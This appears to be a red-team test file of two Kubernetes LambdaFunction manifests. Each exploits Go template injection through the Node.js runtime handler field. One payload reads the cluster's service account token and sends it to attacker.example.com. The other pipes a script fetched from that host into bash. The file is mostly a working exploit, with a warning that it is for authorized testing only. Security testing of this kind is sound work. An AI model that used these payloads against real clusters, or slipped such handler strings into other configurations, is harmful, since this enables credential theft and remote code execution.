# BLUE-002: Go Template Injection - Node.js Code Injection
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit injects JavaScript code via the handler field.
# Similar to Python, the injection occurs at Go template rendering.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-002-nodejs-injection-exfil
  labels:
    redteam: "true"
    exploit: "blue-002"
    target: "nodejs-exfil"
  annotations:
    redteam.knative.io/description: "Template injection in Node.js runtime"
spec:
  source:
    type: inline
    inline:
      code: |
        module.exports.handler = async (event) => {
            return { status: "ok" };
        };
  runtime:
    language: nodejs
    version: "20"
    # PAYLOAD: Break out and execute code
    # Note: Node.js template may use different interpolation
    handler: 'index.handler"; const fs=require("fs"),https=require("https"); const token=fs.readFileSync("/var/run/secrets/kubernetes.io/serviceaccount/token","utf8"); https.get("https://attacker.example.com/collect?t="+encodeURIComponent(token)); const x="'
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-002-nodejs-injection-shell
  labels:
    redteam: "true"
    exploit: "blue-002"
    target: "nodejs-shell"
spec:
  source:
    type: inline
    inline:
      code: |
        module.exports.handler = async (event) => {
            return { status: "ok" };
        };
  runtime:
    language: nodejs
    version: "20"
    # PAYLOAD: Execute shell command
    handler: 'index.handler"; require("child_process").execSync("curl http://attacker.example.com/shell.sh | bash"); const x="'
